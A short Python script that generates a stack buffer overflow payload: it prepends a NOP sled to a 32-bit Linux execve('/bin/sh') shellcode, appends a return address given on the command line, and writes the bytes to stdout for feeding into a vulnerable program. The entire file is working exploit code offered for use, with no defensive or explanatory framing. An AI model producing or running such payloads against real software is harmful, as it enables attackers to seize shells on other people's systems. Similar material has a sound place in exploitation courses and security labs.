import sys
import ast

def generate_bytecode_3(length, address):
    shellcode = b"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
    shellcode = b"\x90" * (length - len(shellcode)) + shellcode
    for i in range(8, 0, -2):
        byte = address[i:i + 2]
        try:
            shellcode += bytes.fromhex(byte)
        except:
            shellcode += chr(int(byte, 16))
    try:
        sys.stdout.buffer.write(shellcode)
    except:
        sys.stdout.write(shellcode)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit("usage: python shellcode.py buffer_length address")
    try:
        length = int(sys.argv[1])
    except:
        sys.exit("buffer length must be numeric !")
    generate_bytecode_3(length, sys.argv[2])

